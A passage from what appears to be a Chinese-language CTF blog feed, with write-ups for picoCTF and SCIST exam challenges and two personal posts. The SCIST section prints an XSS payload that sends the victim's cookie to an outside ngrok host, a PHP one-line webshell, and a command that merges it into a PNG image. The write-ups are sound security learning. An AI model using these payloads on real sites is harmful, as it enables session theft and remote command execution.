Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_msb</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    pixels = image.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 獲取圖片尺寸</span></span><br><span class="line">    width, height = image.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化儲存提取自MSB的字串</span></span><br><span class="line">    msb_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取每個像素的MSB</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            r, g, b = pixels[x, y]</span><br><span class="line">            <span class="comment"># AND運算只保留了r, g, b的最高位，後面清零，再右移7位</span></span><br><span class="line">            msb_data += <span class="built_in">str</span>((r &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((g &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((b &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 將提取的MSB每8個位元轉換成字元</span></span><br><span class="line">    hidden_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msb_data), <span class="number">8</span>):</span><br><span class="line">        byte = msb_data[i : i + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">8</span>:</span><br><span class="line">            hidden_text += <span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hidden_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pico_ctf</span>(<span class="params">data</span>):</span><br><span class="line">    pattern = <span class="string">r&quot;picoCTF\&#123;.*?\&#125;&quot;</span></span><br><span class="line">    matches = re.findall(pattern, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No matches found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    image_path = (</span><br><span class="line">        <span class="string">&quot;MSB/Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png&quot;</span>  <span class="comment"># 替換為你的路徑</span></span><br><span class="line">    )</span><br><span class="line">    hidden_message = extract_msb(image_path)</span><br><span class="line">    find_pico_ctf(hidden_message)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c&#125;</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="GDB-Test-Drive"><a href="#GDB-Test-Drive" class="headerlink" title="GDB Test Drive"></a>GDB Test Drive</h2><p>這題的話先用<code>wget</code>把題目這個二進制檔案抓下來。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701212911463.png" alt="Wget"></p><p>然後後面的步驟基本上就照著題目給的指令一步一步來就可以了。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213346170.png" alt="Instructions"></p><p>這邊來稍微解釋一下每個指令的意義，他到底是做了哪些事情呢？</p><ul><li><code>chmod +x gdbme</code><ul><li>修改 gdbme 檔案的權限，新增執行權限（x）</li></ul></li><li><code>gdb gdbme</code><ul><li>使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。</li></ul></li><li><code>layout asm</code><ul><li>啟用組合語言（Assembly, ASM）視圖</li></ul></li><li><code>break *(main+99)</code><ul><li>在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。</li></ul></li><li><code>jump *(main+104)</code><ul><li>跳到 main 函數開始偏移 104 位元組的地方繼續執行。</li></ul></li></ul><p>至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做<code>sleep</code>，所以當我們直接執行 gdbme 的時候會進入到<strong>sleep</strong>的狀態，讓我們以為這個程式沒有做任何事。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/H1IxfrlvA.png" alt="Sleep function"></p><p>所以在這邊我們才要把斷點設在 main+99，讓他執行到這邊的時候暫停一下，然後我們直接使用 jump 叫到下面一個地方，也就是 main+104 繼續執行。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213211218.png" alt="Flag"></p><p>這樣就得到 flag 啦。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;d3bugg3r_dr1v3_72bd8355&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc-General-Skills"><a href="#Misc-General-Skills" class="headerlink" title="Misc (General Skills)"></a>Misc (General Skills)</h1><h2 id="binhexa"><a href="#binhexa" class="headerlink" title="binhexa"></a>binhexa</h2><p>這題比較簡單，就是一些基礎的 Binary operations 和最後把 bin 轉為 hexadecimal 就行了，它主要有六題的邏輯運算和一題 bin to hexadecimal。我是直接使用 picoCTF 提供的 Webshell 進行 nc 連接，然後用<a href="https://www.rapidtables.com/calc/math/binary-calculator.html">這個線上工具</a>運算。題目如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Binary Number 1: 00101010</span><br><span class="line">Binary Number 2: 00101011</span><br><span class="line"></span><br><span class="line">Question 1/6:</span><br><span class="line">Operation 1: &#x27;&amp;&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101010</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 2/6:</span><br><span class="line">Operation 2: &#x27;*&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 11100001110</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 3/6:</span><br><span class="line">Operation 3: &#x27;&lt;&lt;&#x27;</span><br><span class="line">Perform a left shift of Binary Number 1 by 1 bits.</span><br><span class="line">Enter the binary result: 1010100</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 4/6:</span><br><span class="line">Operation 4: &#x27;+&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 1010101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 5/6:</span><br><span class="line">Operation 5: &#x27;|&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101011</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 6/6:</span><br><span class="line">Operation 6: &#x27;&gt;&gt;&#x27;</span><br><span class="line">Perform a right shift of Binary Number 2 by 1 bits.</span><br><span class="line">Enter the binary result: 10101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Enter the results of the last operation in hexadecimal: 15</span><br><span class="line"></span><br><span class="line">Correct answer!</span><br><span class="line">The flag is: picoCTF&#123;b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e&#125;</span><br></pre></td></tr></table></figure><p>這樣就得到 flag 啦！Easy peasy。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> 資安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Why Do I Start Blogging</title>
      <link href="/LifeAndTalk/Why-Do-I-Start-Blogging/"/>
      <url>/LifeAndTalk/Why-Do-I-Start-Blogging/</url>
      
        <content type="html"><![CDATA[<h1 id="Big-bang-宇宙的起源"><a href="#Big-bang-宇宙的起源" class="headerlink" title="Big bang! 宇宙的起源"></a>Big bang! 宇宙的起源</h1><p>我其實從很久以前就有想要架設自己的網站，上了大學後又看到更多厲害的前輩們都會有自己的網站來記錄自己的成長，於是下定決心也要來建立自己的 Blog。再加上我今年（2023 開始）剛好把 Instagram 關版了（想挑戰一年不用 Instagram），所以剛好就利用這邊來記錄我的生活和技術類文章吧！（未來可能會順便紀錄一些旅遊、和朋友的約、blablabla）</p><p>在架站的時候也一直在想，如果我直接寫在 Medium 之類的平台是不是更方便，還能有快速的 SEO 成效。但後來想想，架在 Medium 終究是被動的，也不知道哪天 Medium 是否會像無名小站一樣倒閉，反而架在自己的站才是掌握了主控權。至於 SEO 的部分嘛，慢慢來吧！慢工出細活！</p><h1 id="對自己的期許"><a href="#對自己的期許" class="headerlink" title="對自己的期許"></a>對自己的期許</h1><p>因為我是一個很懶惰的人 XD，所以希望我可以頻繁且持續的更新文章。並且期待自己可以累積到越來越多的讀者，最後也會希望自己的文章真的可以幫助到其他人！</p><h1 id="對讀者們的期待"><a href="#對讀者們的期待" class="headerlink" title="對讀者們的期待"></a>對讀者們的期待</h1><p>希望大家看完我的文章後，有甚麼想法都可以在底下留言和我互動（這也是我會開留言區的原因，害羞的話按個表情也可以的）。又或是我在技術類的文章中可能有甚麼寫錯的地方，也都可以直接留言和我討論，我都會盡快地回復你。最後如果想持續的接收我最新的文章，也歡迎可以<a href="https://cx330.tw/subscribe">訂閱我的 Blog</a>！我會很感激的！</p>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 Summer Intensive Training Plan</title>
      <link href="/LifeAndTalk/2024-Summer-Intensive-Training-Plan/"/>
      <url>/LifeAndTalk/2024-Summer-Intensive-Training-Plan/</url>
      
        <content type="html"><![CDATA[<h1 id="為甚麼要修煉"><a href="#為甚麼要修煉" class="headerlink" title="為甚麼要修煉?"></a>為甚麼要修煉?</h1><p>有鑑於這次 AIS3 Pre-exam 的成績不甚理想。我決定要來在這次暑假的時候展開特訓，來這邊立個旗。以下來講講我打算怎麼修煉！</p><h1 id="怎麼修煉"><a href="#怎麼修煉" class="headerlink" title="怎麼修煉?"></a>怎麼修煉?</h1><p>可能會像 IT 邦幫忙鐵人賽的感覺吧，但沒辦法到每天上傳，因為還有其他安排（專案 AND 和朋友出門）。不過我對自己的期許是至少可以上傳 30 篇 Write Up。範圍的話可能就包含 picoCTF 的題目、AIS3 Pre-exam 的題目以及各式各樣 CTF 平台的題目。對了忘記講，一個絕對要完成的目標是 picoCTF 打到 10000 分，因為我下學期要認真去 BEEF SOUP 上課了啦！然後為了加入戰隊分數得達標，下學期的目標是盡力拿個獎！</p><h1 id="大家可以幫我個忙嗎！"><a href="#大家可以幫我個忙嗎！" class="headerlink" title="大家可以幫我個忙嗎！"></a>大家可以幫我個忙嗎！</h1><p>希望大家可以好好的監督我，我會開留言區，或是認識我的人也可以直接私訊我。如果我太久沒有更新文章可以來提醒我！如果我某段期間有事情、出去玩、blabla 的我應該會公告在網頁上，所以如果沒特殊狀況又沒更新就是我在偷懶，請監督我！</p><blockquote><p>“We used to look up at the sky and wonder at our place in the stars. Now we just look down, and worry about our place in the dirt.” — <strong><em>Interstellar</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCIST S4 資訊安全期末考 Writeup</title>
      <link href="/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/"/>
      <url>/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/</url>
      
        <content type="html"><![CDATA[<p>我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p><h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再透過以下的 index.js 代碼可以找到真正的 input。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是<code>?</code>，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是<code>F</code>，就是 index 為 1 的位置。</p><p>知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure><p>我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure><h1 id="XSSER"><a href="#XSSER" class="headerlink" title="XSSER"></a>XSSER</h1><p>看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure><p>其中”note&#x2F;“路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的 note ID。</p><p>到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure><p>發現 note 只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。</p><p>我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。</p><p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去”check”的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。</p><h1 id="Uploader"><a href="#Uploader" class="headerlink" title="Uploader"></a>Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img src="https://hackmd.io/_uploads/ByG6mhhcT.png"><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers <code>89504E47</code>嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。</p><p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure><p>接著我將 pwn.png 上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。</p><h1 id="Common-modulus"><a href="#Common-modulus" class="headerlink" title="Common modulus"></a>Common modulus</h1><p>這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) &#x3D; 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 &#x3D; 1 的條件，加上一點計算，去找出原本的 m，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n</span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n</span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n</span><br><span class="line">= m</span><br></pre></td></tr></table></figure><p>可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了<a href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">一篇文章</a>，裡面的方法是這樣:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure><p>所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span 